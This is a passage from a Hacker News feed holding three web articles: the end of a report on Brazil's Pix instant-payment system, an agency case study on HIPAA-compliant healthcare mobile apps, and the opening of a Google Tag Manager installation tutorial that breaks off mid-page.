<p>The study predicts that Pix will achieve mass adoption (i.e., be used for 25% of all household payments) within five years and move between 1 trillion reais ($200 billion) and 1.5 trillion reais ($300 billion) per year. That‚Äôs close to 20% of Brazil‚Äôs current GDP of 7.3 trillion reais ($1.46 trillion). ‚ÄúThe Brazilian card industry, both debit and credit, moved 1.8 trillion reais ($360 billion) in 2019. So Pix can have practically that same size in 2025,‚Äù said Ricardo Pandur, payment specialist at Accenture.</p>



<p>But it remains to be seen who exactly will turn to Pix. The Central Bank is betting on its appeal to the <a href="https://www1.folha.uol.com.br/mercado/2020/10/pandemia-leva-a-bancarizacao-de-quase-10-milhoes-de-pessoas.shtml">36 million Brazilians</a> with no bank accounts. For them, Pix could serve as an entry point to financial services.</p>


<div>

<div>

<div>
<table>
<tbody>
<tr><td>Name:</td><td>Pix</td></tr>
<tr><td>Owner:</td><td>Brazil‚Äôs Central Bank</td></tr>
<tr><td>Start date:</td><td>November 16, 2020</td></tr>
<tr><td>Number of users expected by the end of first year:</td><td>30 million</td></tr>
<tr><td>Total payments processed (forecast):</td><td>$200 billion (R$1 trillion) by the end of 2025
</td></tr>
<tr><td>*Source:</td><td>Accenture</td></tr>
</tbody></table>
</div>
</div>
</div>


<div><p>For consumers, Pix will be an alternative to cash and debit cards, a cheap, fast method of money transfer, and even an easy way to pay taxes. For retailers, Pix will be cheaper than card operators, with potentially zero cost to them or their customers.</p><p>But access to Pix is conditional on access to a smartphone or a computer as well as a stable data connection. Even with increased connectivity and phone use, <a href="https://www.pewresearch.org/global/wp-content/uploads/sites/2/2019/02/Pew-Research-Center_Global-Technology-Use-2018_2019-02-05.pdf">40% of all Brazilian adults</a> still don‚Äôt have a smartphone. Potential users might have trouble understanding the system of personal keys and QR codes. ‚ÄúUnderstanding a payment mechanism is not as simple as learning to use social media,‚Äù said Ricardo Rocha, a professor of finance at Insper in S√£o Paulo.</p></div>



<div><p>With new technology comes new vulnerabilities to scams and phishing attempts. Pix will be incorporated into banks‚Äô native apps and websites and have the added benefit of encrypted transactions. But it will be up to the same banks to explain the risks while pushing for widespread adoption.</p><p>Some startups might have been pushing for adoption a little too far.&nbsp;Clients of online banks <a href="https://restofworld.org/2020/david-velez-nubank/">Nubank</a> and C6 and digital wallets PagSeguro and MercadoPago took to social media to complain that the companies registered their keys <a href="https://g1.globo.com/economia/noticia/2020/10/19/procon-notifica-nubank-e-mercado-pago-sobre-cadastramento-de-chaves-no-pix.ghtml">without their explicit consent</a>. The Central Bank started a <a href="https://exame.com/seu-dinheiro/bc-investiga-denuncia-de-cadastramento-indevido-das-chaves-do-pix/">formal investigation</a> and Brazil‚Äôs primary consumer defense entity <a href="https://g1.globo.com/economia/noticia/2020/10/19/procon-notifica-nubank-e-mercado-pago-sobre-cadastramento-de-chaves-no-pix.ghtml">questioned</a> their methods, but the corporations claimed they followed all guidelines and that their clients were notified via apps.</p></div>



<p>Even so, the future of Pix looks promising. Between October 5, when the Central Bank started to allow users to enroll their Pix keys ahead of the November launch date, and October 22, there have been 50 million enrollments. On the first day alone, 3.5 million keys entered the system, and the demand was so high that many banking apps crashed.</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/cash-debit-or-pix/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942060</guid>
            <pubDate>Fri, 30 Oct 2020 13:40:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mobile Apps for US-Based Electronic Health Record Software Provider]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942018">thread link</a>) | @_Tata_
<br/>
October 30, 2020 | https://www.ego-cms.com/centralreach | <a href="https://web.archive.org/web/*/https://www.ego-cms.com/centralreach">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><h2>The process</h2><p>The first thing to consider when developing a healthcare app is <a href="https://www.hhs.gov/sites/default/files/ocr/privacy/hipaa/administrative/securityrule/techsafeguards.pdf" rel="nofollow" target="_blank"><span><strong>compliance with HIPAA security standards</strong></span></a><span>.</span> With our background in creating medical apps, we know how to combine HIPAA compliance, an emotional UI, and a smart UX into a handy app.</p></div><p>To make the development process more efficient, we used the <a href="https://visualstudio.microsoft.com/ru/xamarin/?rr=https%3A%2F%2Fmy.readymag.com%2Fedit%2F889974%2Fpreview%2F5%2F" rel="nofollow" target="_blank">Xamarin</a> cross-platform framework. Xamarin lets us deliver apps on two platforms quickly and cost-effectively.</p><p>We collaborated closely with CentralReach‚Äôs Lead Server Engineer and their web development team to convert tasks into designs and code. As a result, we developed iOS and Android apps that perfectly integrate with the CentralReach web application.</p><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team.png" sizes="(max-width: 767px) 88vw, (max-width: 991px) 94vw, 100vw" srcset="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team-p-500.png 500w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team-p-800.png 800w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1e0bbc84ad821660ec068d_5_team.png 1024w" alt=""></p><p>Our PM during a meeting with the CentralReach Team</p></div><div><p>We decided to start the design process with defining and building a core app structure and navigation. This strategy helped us create the app‚Äôs logic.</p></div></div></div><div><div><div><div><div><div data-w-id="7722f573-02ad-1641-54fe-1d32747c43e3"><div><p><strong><em>The application supports the fingerprint authentication feature for both iOS and Android</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>In-app navigation represented with the simple side drawer.</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>We integrated Google Maps for Android and Apple Maps for iOS devices to implement a route guidance feature.</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>In addition to being HIPAA-compliant, client data is further protected by a lockscreen feature. Users may also log out via lockscreen, in case the app is being used by several specialists within one organization</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>Modal View with different file options</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div><div><p><strong><em>To prevent the app from ‚Äúhogging‚Äù all the memory on a device, services providers can decide for themselves how much space the app will use to store files and can control the storage level, conveniently in the app settings</em></strong></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d1f5a2079afed002c838f7c_5_icon_info_scheme.png" alt=""></p></div></div></div></div></div></div></div><div><div><h2><strong>Wireframes</strong></h2><p>We started with sketches on paper. After discussing a lot of different concepts, we came up with high fidelity wireframes.</p></div></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dcf12b4a76d20253a856f_6_messags_wf.png" alt=""></p><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dd2c5358ee938831cce18_6_new_message_wf.png" alt=""></p></div><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567232"><p><em>Everything you need is in your hands. Track, manage, and plan your day with scheduling functionality.</em></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dd991b1d7895fc14f0da6_6_dashboard_wf.png" alt=""></p></div><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567238"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d30888f26763453d6ea2924_6_notes_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d3089bcc13cb6741a4bdf8f_6_add_lable_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf456723d"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308a84be811898d72d5438_6_map_wf.png" alt=""></p><p><strong><em>Service providers can easily get driving directions to their session locations.</em></strong></p></div><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567244"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308c3ec13cb6e62d4bec08_6_pin_code_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308d392676347329ea3e44_6_chat_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567249"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308dcb85ef61da385eb0bc_6_signature_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308eacc13cb6004a4bf8ab_6_settings_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf456724e"><p><em>Simple login that supports fingerprint authentication.</em></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d308f57c13cb6f0c04bfd11_6_signin_wf.png" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d3090a9b0d1302b2de24127_6_menu_wf.png" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d309144267634838cea5498_6_edit_location_wf.png" alt=""></p><div data-w-id="a4eba3ef-9825-0e79-4602-d01cf4567258"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dd2c5358ee938831cce18_6_new_message_wf.png" alt=""></p></div></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dc69bb78ea802a0854413_phone.png" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d2dc69bb4a76db0ce3a5a81_6_app_animation_in_phone.gif" alt=""></p></div></div></div></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2.jpg" sizes="(max-width: 1800px) 100vw, 1800px" srcset="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2-p-800.jpeg 800w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2-p-1600.jpeg 1600w, https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d54234814013153a2cf53dd_8_phones_background2.jpg 1800w" alt=""></p><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c1474313d9a85005a91aa_9_pin_code.png" alt=""><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c1474e11fbe43926197e1_9_signature.png" alt=""><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c14747ec3662314bea542_9_lable.png" alt=""></p><div><div><h2><strong>Functionality</strong></h2><p>The CentralReach platform has a wide range of features, but we identified just three core features to include in the first version of the mobile app. This let us get initial user feedback before developing the remaining features. We‚Äôve already implemented scheduling and messaging, and we‚Äôre planning to develop the file management system in the next iteration.</p></div><div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d668a6bb072640aafc73144_Scheduling2.gif" alt=""></p><div data-w-id="d1f156ec-c5b8-93ad-fbf7-bd55568c57f3"><h2><strong>Scheduling</strong></h2><p>With the <strong>scheduling feature,</strong> service providers can organize their schedules from anywhere at any time using the built-in calendar.</p><p>Intuitive navigation allows service providers to easily access their scheduled appointments, see appointment details, change the date and time of appointments, and subsequently communicate those changes to clients. This ensures that clients and services providers are kept in sync in real-time through the app.</p></div></div></div><p>Each appointment is available on the home screen, allowing service providers and clients to easily view essential information including:</p><div><div data-w-id="062a8657-b820-edff-b4c7-9b7aa16f24db"><h2><strong>Messaging</strong></h2><p>To make conversations between service providers and clients easier and more convenient, we integrated secure real-time in-app messaging that‚Äôs <strong>HIPAA-compliant.</strong></p><p>At CentralReach‚Äôs request, we implemented an in-app messaging system using <a href="https://quickblox.com/" target="_blank"><strong>Quickblox</strong></a><strong>,</strong> which provided us with the infrastructure required for chat functionality. With in-app chat, service providers and patients no longer need to use third-party messaging apps. Their private conversations are secured within the app.</p></div><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d668bde453152190f9c5dea_11_messages2.gif" alt=""></p></div><div data-w-id="41a2d73b-be20-40f9-b8f2-d17f25f09844"><div><h2><strong>File management system</strong></h2><p>This project is ongoing, and in the next version we‚Äôre planning to implement a feature that enables service providers to access files they need while they‚Äôre on the go, even without an internet connection. This file management system will allow service providers to:</p></div><div><div data-w-id="ed7bb160-c295-cfd2-068b-bbb565e9c96d"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c32007ec36600c7bf7ba6_12_icon_cloud_cross.png" alt=""></p><p><h3><strong>Access essential files in<br>offline mode</strong></h3></p></div><div data-w-id="ed7bb160-c295-cfd2-068b-bbb565e9c96e"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c3201e11fbe7615625f7b_12_icon_lock.png" alt=""></p><p><h3><strong>Control document accessibility (for example, mark as read-only)</strong></h3></p></div><div data-w-id="78e7c47c-c9db-f6de-981f-9aaf0b5a8140"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c3200e11fbe7f1c625f79_12_icon_folder.png" alt=""></p><p><h3><strong>Organize files and sort them <br>into folders</strong></h3></p></div></div><div><div data-w-id="c2f09bd3-612c-f089-d576-7f2f4bfe3137"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c32005c898042edbfa77a_12_icon_doc.png" alt=""></p><p><h3><strong>Work with a wide range of <br>file types</strong></h3></p></div><div data-w-id="c2f09bd3-612c-f089-d576-7f2f4bfe3140"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90eb3b727e726/5d4c3201e11fbe2643625f7a_12_icon_cloud.png" alt=""></p><p><h3><strong>Upload, share, and view files on<br>any device</strong></h3></p></div></div></div></div><div><div><p>CentralReach tested the waters by working on this project with us. We‚Äôve <span><strong>successfully launched</strong></span> the first version of this app, and we‚Äôre continuing to build our project team and crank out amazing new features.</p></div></div><div><div><section><div data-ix="in-5-fade-300"><h2>We‚Äôre Sure You Have an Amazing Idea</h2><p>Let‚Äôs discuss how to bring it to life.</p><a href="https://www.ego-cms.com/contact-us" data-w-id="c66f8563-c48c-2b07-207c-728c2ca3b362"><p>CONTACT US</p></a></div></section></div></div></div></div>]]>
            </description>
            <link>https://www.ego-cms.com/centralreach</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942018</guid>
            <pubDate>Fri, 30 Oct 2020 13:35:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn setting up Google Tag Manager with this tutorial]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941974">thread link</a>) | @arctic-hunter
<br/>
October 30, 2020 | https://bluerivermountains.com/en/google-tag-manager-setup | <a href="https://web.archive.org/web/*/https://bluerivermountains.com/en/google-tag-manager-setup">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><main role="main"><div><figure><div></div></figure><p>As a <a href="https://bluerivermountains.com/en/google-tag-manager-consultant">Google Tag Manager consultant</a>, I've set up GTM on <b>100+ client websites</b>. This Google Tag Manager tutorial is where I teach you the process I've refined over the years, step by step, with examples and videos for you to learn.</p><p>Further down, you can <a href="https://bluerivermountains.com/en/google-tag-manager-setup#download-gtm-config-container-file">download a GTM setup configuration file</a> with all of the following best practices to import into your container.</p><p>If you can't wait, jump right into the <a href="https://bluerivermountains.com/en/google-tag-manager-setup#install-google-tag-manager-on-your-website">installation</a> tutorial or learn <a href="https://bluerivermountains.com/en/google-tag-manager-setup#how-to-set-up-google-tag-manager">how to set up Google Tag Manager</a>. But if you are a <b>beginner</b> it is important to first understand <em>how</em> to use a <a href="https://bluerivermountains.com/en/tag-management">tag management system</a> together with other tools.</p><p>So keep on reading below first.</p><h2 id="how-to-use-google-tag-manager"><a href="#how-to-use-google-tag-manager" aria-label="How to use Google Tag Manager?" title="Right click to copy link to paragraph"></a>How to use Google Tag Manager?</h2><p>I assume you already know <a href="https://bluerivermountains.com/en/what-is-google-tag-manager">what Google Tag Manager is</a>. So lets talk about how GTM works and how to use it.</p><p>Ideally, you only want to have <b>one</b> 3rd-party tag in the source code of your website or web app.</p><a href="https://twitter.com/intent/tweet?text=The%20only%203rd-party%20tag%20on%20your%20website%20should%20be%20the%20Google%20Tag%20Manager%20code%20snippet.%20-%20via%20undefined" target="_blank"><section><p><b>The only 3rd-party tag on your website should be the Google Tag Manager code snippet.</b></p><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>All other tags are then implemented through the tag manager itself. Other marketing and tracking tags are e.g. Google Analytics (GA), Facebook, Twitter, Linkedin, AdWords, DoubleClick and god knows what.</p><p>The primary reason are the <a href="https://bluerivermountains.com/en/google-tag-manager-benefits">advantages of Google Tag Manager</a>:</p><ul><li><b>easier &amp; faster</b> implementation of marketing tags</li><li>scalability on every page and across multiple domains</li><li><b>built-in triggers</b> for form submissions, scroll tracking&nbsp;&amp; video tracking</li><li>manage users with multiple gtm accounts</li><li>a bit <a rel="noopener" target="_blank" href="https://marketingland.com/audit-of-online-retailer-sites-shows-tag-management-systems-improve-load-times-reduce-errors-62173">faster site load speed</a></li></ul><p>Due to these advantages, already <a target="_blank" href="https://w3techs.com/technologies/overview/tag_manager">30% of all websites on the internet use a tag manager</a>. And among them Google Tag Manager has a market share of <a target="_blank" rel="noopener" href="https://trends.builtwith.com/analytics/tag-management/traffic/Entire-Internet">94%</a>.</p><p>So, unless you have a solid reason not to add a tag to GTM, as a general rule of thumb, <b>add all tags to the GTM container</b>.</p><a href="https://twitter.com/intent/tweet?text=Use%20GTM%20like%20a%20connecting%20layer%20between%20your%20website%20and%203rd-party%20tags.%20-%20via%20undefined" target="_blank"><section><p><b>Use GTM like a connecting layer between your website and 3rd-party tags.</b></p><img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJDYXBhXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMjRweCIgaGVpZ2h0PSIyNHB4IiAgdmlld0JveD0iMCAwIDUxMiA1MTIiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDUxMiA1MTI7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxnPg0KCQk8cGF0aCBkPSJNNTEyLDk3LjI0OGMtMTkuMDQsOC4zNTItMzkuMzI4LDEzLjg4OC02MC40OCwxNi41NzZjMjEuNzYtMTIuOTkyLDM4LjM2OC0zMy40MDgsNDYuMTc2LTU4LjAxNg0KCQkJYy0yMC4yODgsMTIuMDk2LTQyLjY4OCwyMC42NC02Ni41NiwyNS40MDhDNDExLjg3Miw2MC43MDQsMzg0LjQxNiw0OCwzNTQuNDY0LDQ4Yy01OC4xMTIsMC0xMDQuODk2LDQ3LjE2OC0xMDQuODk2LDEwNC45OTINCgkJCWMwLDguMzIsMC43MDQsMTYuMzIsMi40MzIsMjMuOTM2Yy04Ny4yNjQtNC4yNTYtMTY0LjQ4LTQ2LjA4LTIxNi4zNTItMTA5Ljc5MmMtOS4wNTYsMTUuNzEyLTE0LjM2OCwzMy42OTYtMTQuMzY4LDUzLjA1Ng0KCQkJYzAsMzYuMzUyLDE4LjcyLDY4LjU3Niw0Ni42MjQsODcuMjMyYy0xNi44NjQtMC4zMi0zMy40MDgtNS4yMTYtNDcuNDI0LTEyLjkyOGMwLDAuMzIsMCwwLjczNiwwLDEuMTUyDQoJCQljMCw1MS4wMDgsMzYuMzg0LDkzLjM3Niw4NC4wOTYsMTAzLjEzNmMtOC41NDQsMi4zMzYtMTcuODU2LDMuNDU2LTI3LjUyLDMuNDU2Yy02LjcyLDAtMTMuNTA0LTAuMzg0LTE5Ljg3Mi0xLjc5Mg0KCQkJYzEzLjYsNDEuNTY4LDUyLjE5Miw3Mi4xMjgsOTguMDgsNzMuMTJjLTM1LjcxMiwyNy45MzYtODEuMDU2LDQ0Ljc2OC0xMzAuMTQ0LDQ0Ljc2OGMtOC42MDgsMC0xNi44NjQtMC4zODQtMjUuMTItMS40NA0KCQkJQzQ2LjQ5Niw0NDYuODgsMTAxLjYsNDY0LDE2MS4wMjQsNDY0YzE5My4xNTIsMCwyOTguNzUyLTE2MCwyOTguNzUyLTI5OC42ODhjMC00LjY0LTAuMTYtOS4xMi0wLjM4NC0xMy41NjgNCgkJCUM0ODAuMjI0LDEzNi45Niw0OTcuNzI4LDExOC40OTYsNTEyLDk3LjI0OHoiLz4NCgk8L2c+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" alt="share on twitter" height="24px"></section></a><p>Use GTM like a <b>middle-layer</b> between your website and 3rd-party services. Without it, your site and 3rd party tags are not in direct connection. Those services are mostly JavaScript libraries for marketing or tracking tools that are implemented with a tag. But any other tags apply as well.</p><p>The only exception to the rule applies when you do&nbsp;conversion optimization&nbsp;with split-testing tools.</p><p>Because during conversion rate optimization, A/B tests are going to load different variants of a page. So the visitor may see how the content is re-rendered for a split-second.</p><p>To avoid CSS flicker and ensure that variant tests load fast, a split-testing tag may also go directly into the source code.</p><p>Now that we have this out of the way, let‚Äôs look at the implementation.</p><h2 id="install-google-tag-manager-on-your-website"><a href="#install-google-tag-manager-on-your-website" aria-label="Install Google Tag Manager on your website" title="Right click to copy link to paragraph"></a>Install Google Tag Manager on your website</h2><p>Let's start the Google Tag Manager tutorial by showing you where to get the Google Tag Manager code snippet and then where to install it on the website. You can log in just by using your usual Google account.</p><ol><li><h3 id="create-a-google-tag-manager-account"><a href="#create-a-google-tag-manager-account" aria-label="Create a Google Tag Manager account" title="Right click to copy link to paragraph"></a>Create a Google Tag Manager account</h3>To install GTM, you first have to go to the <a rel="noopener" target="_blank" href="https://tagmanager.google.com/">official website</a> and create a new Google Tag Manager account.<br><figure><div></div><figcaption>First, create a Google Tag Manager account, and choose a container name, like your website name and then get the code snippet.</figcaption></figure></li><li><h3 id="create-a-web-property"><a href="#create-a-web-property" aria-label="Create a web-property" title="Right click to copy link to paragraph"></a>Create a web-property</h3>Select the <b>Web</b> property to get a code for a website or web app.<br><figure><div></div><figcaption>There are multiple types of containers available in a GTM account. For websites, choose web. Note that there are other tag manager container types for AMP pages, iOS and Android too.</figcaption></figure></li><li><h3 id="implement-the-google-tag-manager-code"><a href="#implement-the-google-tag-manager-code" aria-label="Implement the Google Tag Manager code" title="Right click to copy link to paragraph"></a>Implement the Google Tag Manager code</h3><ul>Afterwards, you will be shown the Google Tag Manager code to implement on your website.<br><figure><div></div><figcaption>This is the Google Tag Manager container tag. It has two parts. The instructions how to implement the script tags are written above each part.</figcaption></figure><li>Take the <b>first part</b> of the container tag and put it as high as possible in the <b>head</b> tag on every page of your website. This ensures that you can fire tags early during page loads.</li><li>The <b>second part</b> is an iframe to run in browsers that have JavaScript disabled. Install the tag as high as possible in the <b>body</b> tag on each page of your website.<br><figure><div></div><figcaption>The first tag in the &lt;head&gt; is a data layer. Don't worry if you don't know yet what that is (first arrow). Next is the first part of the GTM tag (second arrow). Finally, the other part of the GTM tag is implemented high up in the &lt;body&gt; element.  or JavaScript code can be implemented in between, but a data layer is always implemented before the GTM tag and the &lt;noscript&gt; GTM tag is always last.</figcaption></figure></li></ul></li></ol><p>This is the common method to implement GTM.</p><p>Do you use a popular content management system? If yes, you can also use a <b>plugin</b> that takes care of the Google Tag Manager installation.</p><p>That said:</p><a href="https://twitter.com/intent/tweet?text=If%20your%20CMS%20also%20offers%20you%20a%20plugin%20to%20install%20other%20tags,%20don%27t%20use%20yet%20another%20plugin%20to%20install%20Google%20Analytics,%20Facebook%20or%20Google%20Ads.%20Instead,%20use%20GTM%20to%20install%20those%20tags.%20-%20via%20undefined" target="_blank"><section type="info"><img 